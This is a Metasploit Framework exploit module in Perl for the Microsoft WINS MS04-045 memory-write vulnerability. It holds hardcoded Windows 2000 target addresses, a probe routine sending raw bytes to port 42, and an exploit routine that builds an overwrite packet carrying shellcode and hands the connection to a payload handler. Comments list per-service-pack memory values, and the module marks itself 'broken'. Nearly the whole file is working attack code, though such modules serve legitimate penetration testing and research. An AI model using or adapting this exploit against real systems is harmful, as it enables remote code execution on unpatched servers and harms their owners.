
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wins_ms04_045;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;
use Pex::Utils;
use Pex::Text;

my $advanced = 
{
	'BASE'	=> [0, 'Specify the exact address to the structure'],
	'TARG'	=> [0, 'Specify the exact address to overwrite'],
	'WHAT'	=> [0, 'Specify the data used to overwrite the address'],
};

my $info =
{
    'Name'  => 'Microsoft WINS MSO4-045 Code Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST'  => [1, 'ADDR', 'The target address'],
                    'RPORT'  => [1, 'PORT', 'The target port', 42],
                },

    'Payload' => {
	                 # ws2ord and findrecv both fail
					 
                     'Space'  => 4000,
                     'BadChars'  => '',	
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
        This module exploits a arbitrary memory write flaw in the WINS service.
    }),
                
    'Refs'  =>   [  
                    ['MSB',     'MS04-045'],
                 ],
    'Targets'   =>
                 [
                   ['Windows 2000 English', 0x05391e80, 0x53df4c4, 0x05391ee0],
                 ],
    'Keys'  =>  ['broken'],                 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


# SP4=05371ef8 - "\xa4\xff\x3d\x05\x91\x81\xf9\x77\x40\x96\xf8\x77"
# SP4=05371e90 - "\xa4\xff\x3d\x05\x91\x81\xf9\x77\x40\x96\xf8\x77

# SP0=05371e90 - "\xa4\xff\x3d\x05\xdb\x80\xfb\x77\x78\xae\xf8\x77"

# SP1=05371e90 - "\xa4\xff\x80\x05\x45\x90\xfb\x77\x70\x1f\xf8\x77"

# SP2=05371e90 - "\xa4\xff\x3d\x05\xa7\x9d\xfb\x77\x80\x26\xf8\x77"
# SP2=05371ef8 - "\xa4\xff\x3d\x05\xa7\x9d\xfb\x77\x80\x26\xf8\x77

# SP3=05371e90 - "\xa4\xff\x3d\x05\x95\x2b\xf8\x77\x08\x36\xf8\x77"
# SP3=05372238 - "\xa4\xff\x3d\x05\x95\x2b\xf8\x77\x08\x36\xf8\x77"

# ???=00000039 - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=00000040 - "\x01\x00\x00\x00\x01\x00\x00\x00\x48\x00\x00\x00"
# ???=02171dd0 - "\x48\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00"
# ???=0000003e - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=0000003e - "\xa4\xff\x41\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=0000003d - "\xa4\xff\x41\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=02671dd0 - "\x48\x00\x00\x00\x09\x00\x00\x00\xbb\x03\x00\x00"
# ???=00000040 - "\x84\xf5\x33\x04\x25\x3c\x01\x01\xc0\x01\x00\x00"
# ???=0000003f - "\x84\xf5\x4a\x05\x35\x3c\x01\x01\xac\x01\x00\x00"
# ???=00000040 - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=00000040 - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=0000003a - "\x84\xf5\x73\x03\x35\x3c\x01\x01\xb4\x03\x00\x00"
# ???=05371ef8 - "\xa4\xff\x41\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=05372030 - "\xa4\xff\x41\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=0000003f - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');	
	
	my $req = 
		"\x00\x00\x00\x29\x00\x00\x78\x00\x00\x00\x00\x00".
		"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x02\x00\x05".
		"\x00\x00\x00\x00\x60\x56\x02\x01\x00\x1F\x6E\x03".
		"\x00\x1F\x6E\x03\x08\xFE\x66\x03\x00";
		
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine("[*] Socket error: " . $s->GetError());
		return $self->CheckCode('Connect');
	}

	$s->Send($req);	
	my $res = $s->Recv(-1, 5);
	
	printf( "PTR: %.8x\n", unpack('N', substr($res, 16, 4)));
	
	print Pex::Text::BufferPerl($res);

}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
   
    if (! $self->InitNops(128)) {
	    $self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $base = $target->[1];
	my $targ = $target->[2];
	my $code = $target->[3];
	
	$base = hex($self->GetVar('BASE')) if $self->GetVar('BASE');
	$targ = hex($self->GetVar('TARG')) if $self->GetVar('TARG');
	$code = hex($self->GetVar('WHAT')) if $self->GetVar('WHAT');
	
	my $req;
	$req .= pack('V', $targ - 0x48);
	$req .= Pex::Text::EnglishText(32);
	$req .= pack('V', $code) x 4;
	$req .= $shellcode;
	$req .= Pex::Text::EnglishText(1024);
	
	my $pkt = pack('NNN', length($req) - 8, -1, $base). $req;
	$self->PrintLine(sprintf("[*] Attempting to overwrite 0x%.8x with 0x%.8x (0x%.8x)", $targ, $code, $base));
	my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host,
        'PeerPort'  => $target_port,
    );

    if ($s->IsError) {
        $self->PrintLine("[*] Socket error: " . $s->GetError());
        return(0);
    }

	$s->Send($pkt);
	$self->Handler($s);
	$s->Close;
	return;
}

1;

